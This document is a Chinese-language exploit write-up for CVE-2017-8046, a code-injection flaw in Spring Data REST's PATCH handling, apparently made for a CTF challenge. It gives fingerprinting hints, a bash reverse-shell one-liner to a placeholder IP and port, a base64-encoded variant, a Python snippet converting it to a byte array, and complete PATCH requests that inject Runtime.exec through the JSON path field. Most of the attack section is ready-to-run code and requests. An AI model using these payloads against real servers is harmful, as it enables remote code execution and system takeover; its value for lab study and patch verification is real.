CVE-2017-8046
Spring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。


Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3
Spring Boot version ≤ 2.0.0M4
Spring Data release trains < Kay-RC3

特征spring，有/api目录
或者直接形如响应：
```
{
"_links": {
"people": {
"href": "https://xx/api/people{?page,size,sort}",
"templated": true
}
```

漏洞利用
先POST如下新增一个用户，用户id第一个就是1
```
POST /api/people/ HTTP/1.1
{"fistName":"ctfshow","lastName":"nb"}
```
```
bash -i >& /dev/tcp/ip/port 0>&1
base64一下：

# 自己改弹shell的命令
payload = b'bash -c {echo,YmFzaCAtaSAmPi9kZXYvdGNwL3gueC54LngvMjMzMyA8JjE=}|{base64,-d}|{bash,-i}'

# 将payload转换为字节码字符串
bytecode = ','.join(str(i) for i in list(payload))

# 打印字节码字符串
print(bytecode)
```
```
PATCH /api/people/1 HTTP/1.1
Host: 81f61eb8-42bb-4423-824c-88573a92ebaa.challenge.ctf.show:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json-patch+json
Upgrade-Insecure-Requests: 1
Content-Length: 440

[
    {
        "op": "replace",
        "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{上面生成的一串数字}))/lastName",
        "value": "vulhub"
    }
]
```

```
PATCH /customers/1 HTTP/1.1
Host: 192.168.101.133:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 202

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{9}))/lastname", "value": "vulhub" }]
```